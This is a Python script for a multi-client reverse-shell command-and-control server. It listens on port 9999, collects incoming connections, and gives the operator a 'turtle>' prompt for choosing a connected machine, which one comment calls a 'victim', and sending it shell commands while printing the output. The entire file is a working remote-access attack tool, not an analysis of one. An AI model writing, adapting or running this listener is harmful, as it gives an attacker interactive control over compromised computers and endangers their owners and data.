import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1, 2]
queue= Queue()
all_connections = []
all_address = []

# create a socket(connect to computer)
def create_socket():
	try:
		global host
		global port
		global s
		host='###.###.##.###'
		port=9999
		s=socket.socket()
		print("Socket created")

	except socket.error as msg:
		print("Socket creation error: "+ str(msg))

# Binding the socket and listening for connection

def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding the Port "+str(port))

		s.bind((host, port))
		s.listen(5)

	except socket.error as msg:
		print("Socket creation error: "+ str(msg)+ "\n"+ "Retrying")
		bind_socket()

# Handling connections form multiple client and saving to a list 
# Closing previous connections when this file is restarted 

def accepting_connection():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True:
		try:
			conn,address=s.accept()
			s.setblocking(1) # Prevent Timeout

			all_connections.append(conn)
			all_address.append(address)

			print("Connection has been established :" + address[0])

		except :
			print("Error accepting Connections")

# 2nd thread function - 1) See all client 2) Select a client 3) Send commands to connected client
# Interactive prompt for sending commands

def start_turtle():
	while True:
		cmd=input('turtle>')

		if cmd=='over':
			print("Closing turtle shell")
			break

		if cmd=='list':
			list_connections()

		elif 'select' in cmd:
			conn=get_target(cmd)

			if conn is not None:
				send_target_commands(conn)

		else:
			print("Command not recognised")

# Display all current active connection with the client

def list_connections():
	results = ''

	for i,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(201480)
		except:
			del all_connections[i]
			del all_address[i]
			continue

		results=str(i+1)+ "  ||   " + str(all_address[i][0]) + "   ||  " + str(all_address[i][1])+ "\n"

	print("-----CLIENTS------" + '\n' + results)

#selecting the target
 
def get_target(cmd):
	try:
		target = int(cmd[7]) #target = id
		target-=1
		conn=all_connections[target]
		print("You are connected to :" + str(all_address[target][0]))
		print(str(all_address[target][0]) + '>',end="")
		return conn

	except:
		print("Selection non-valid")
		return None

# Sending commands to client/victim or a friend

def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if cmd=='quit':
				break

			if len(str.encode(cmd))>0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(201480),"utf-8")
				print(client_response,end="")

		except:
			print("Error sending commands")
			break

# Create worker Threads

def create_worker():
	for _ in range(NUMBER_OF_THREADS):
		t=threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do next job that is in the queue ( handling connection , sending commands)

def work():
	while True:
		x=queue.get()

		if x==1:
			create_socket()
			bind_socket()
			accepting_connection()

		if x==2:
			start_turtle()

		queue.task_done()

# Storing job no. list to queue because threading work on queue not list

def create_job():
	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()

def main():
	create_worker()
	create_job()

main()
